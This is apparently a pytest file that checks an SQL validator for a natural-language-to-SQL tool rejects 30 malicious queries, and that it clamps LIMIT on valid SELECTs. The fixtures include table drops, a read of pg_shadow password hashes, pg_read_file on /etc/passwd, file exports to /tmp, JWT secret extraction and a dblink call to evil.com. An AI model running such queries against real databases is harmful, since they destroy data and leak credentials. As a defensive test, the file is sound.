"""Unit and security tests for SQL AST validator against 30 malicious fixtures."""

import pytest
from fieldkit_nl2sql.validator import SQLValidator


@pytest.fixture
def validator() -> SQLValidator:
    return SQLValidator()


MALICIOUS_SQL_FIXTURES = [
    # 1. DDL Drops
    "DROP TABLE suppliers;",
    # 2. DML Update
    "UPDATE purchase_orders SET total_amount = 0 WHERE id IS NOT NULL;",
    # 3. DML Delete
    "DELETE FROM parts WHERE category = 'Seals';",
    # 4. DML Insert
    "INSERT INTO suppliers (name, country) VALUES ('Hacked Corp', 'DE');",
    # 5. DDL Truncate
    "TRUNCATE TABLE shipments;",
    # 6. DDL Alter
    "ALTER TABLE suppliers ADD COLUMN leaked_text text;",
    # 7. DDL Create
    "CREATE TABLE evil_table (id int);",
    # 8. DCL Grant
    "GRANT ALL PRIVILEGES ON ALL TABLES TO public;",
    # 9. DCL Revoke
    "REVOKE SELECT ON suppliers FROM assistant_ro;",
    # 10. Stacked Statements
    "SELECT * FROM suppliers; SELECT * FROM plants;",
    # 11. pg_sleep Denial of Service
    "SELECT pg_sleep(10) FROM suppliers;",
    # 12. COPY data out
    "COPY suppliers TO '/tmp/leak.csv';",
    # 13. System catalog access (pg_user)
    "SELECT usename, passwd FROM pg_catalog.pg_shadow;",
    # 14. Information schema inspection
    "SELECT table_name FROM information_schema.tables WHERE table_schema = 'public';",
    # 15. Alembic internal version table
    "SELECT version_num FROM alembic_version;",
    # 16. Non-allowlisted table (users / accounts)
    "SELECT username, password_hash FROM user_accounts;",
    # 17. Trailing single-line comment injection
    "SELECT id, name FROM suppliers -- bypass where clause",
    # 18. Multi-line block comment injection
    "SELECT id, name /* inline comment trick */ FROM suppliers;",
    # 19. CTE with data modification (DELETE)
    "WITH deleted AS (DELETE FROM shipments RETURNING *) SELECT * FROM deleted;",
    # 20. CTE with data modification (INSERT)
    "WITH inserted AS (INSERT INTO parts (name) VALUES ('X') RETURNING *) SELECT * FROM inserted;",
    # 21. Subquery depth bomb (> 3 levels deep)
    "SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM suppliers) a) b) c;",
    # 22. System file read function
    "SELECT pg_read_file('/etc/passwd');",
    # 23. Remote link function
    "SELECT dblink('host=evil.com', 'SELECT 1');",
    # 24. SELECT INTO OUTFILE
    "SELECT * INTO OUTFILE '/tmp/leak.txt' FROM suppliers;",
    # 25. Large object export
    "SELECT lo_export(1001, '/tmp/leak');",
    # 26. Server configuration extraction
    "SELECT current_setting('app.jwt_secret');",
    # 27. Dynamic SQL EXECUTE
    "EXECUTE format('DROP TABLE %I', 'suppliers');",
    # 28. Anonymous PL/pgSQL block
    "DO $$ BEGIN RAISE NOTICE 'hack'; END $$;",
    # 29. Disallowed table in UNION branch
    "SELECT name FROM suppliers UNION SELECT password FROM secret_passwords;",
    # 30. Stored procedure CALL
    "CALL drop_all_data();",
]


@pytest.mark.parametrize("malicious_sql", MALICIOUS_SQL_FIXTURES)
def test_validator_rejects_all_30_malicious_fixtures(validator: SQLValidator, malicious_sql: str) -> None:
    res = validator.validate(malicious_sql)
    assert res.is_valid is False, f"Expected validator to REJECT malicious SQL: {malicious_sql}"
    assert res.error is not None
    assert res.sanitized_sql is None


def test_validator_accepts_valid_select_and_clamps_limit(validator: SQLValidator) -> None:
    valid_sql = "SELECT id, name, city FROM suppliers WHERE country = 'DE' ORDER BY name ASC LIMIT 50;"
    res = validator.validate(valid_sql)
    assert res.is_valid is True
    assert res.sanitized_sql is not None
    assert "LIMIT 50" in res.sanitized_sql
    assert res.tables == ["suppliers"]


def test_validator_injects_limit_1000_if_missing(validator: SQLValidator) -> None:
    sql_without_limit = "SELECT po_number, total_amount FROM purchase_orders WHERE plant = 'DE-HAM';"
    res = validator.validate(sql_without_limit)
    assert res.is_valid is True
    assert res.sanitized_sql is not None
    assert "LIMIT 1000" in res.sanitized_sql


def test_validator_clamps_excessive_limit(validator: SQLValidator) -> None:
    excessive_limit_sql = "SELECT id FROM shipments LIMIT 50000;"
    res = validator.validate(excessive_limit_sql)
    assert res.is_valid is True
    assert res.sanitized_sql is not None
    assert "LIMIT 1000" in res.sanitized_sql
    assert "LIMIT 50000" not in res.sanitized_sql


def test_validator_allows_valid_joins_and_unions(validator: SQLValidator) -> None:
    join_sql = """
    SELECT s.name, COUNT(po.id) AS po_count, SUM(po.total_amount) AS total_val
    FROM suppliers s
    JOIN purchase_orders po ON s.id = po.supplier_id
    WHERE po.plant = 'DE-STR'
    GROUP BY s.name
    ORDER BY total_val DESC
    LIMIT 20;
    """
    res = validator.validate(join_sql)
    assert res.is_valid is True
    assert set(res.tables) == {"suppliers", "purchase_orders"}
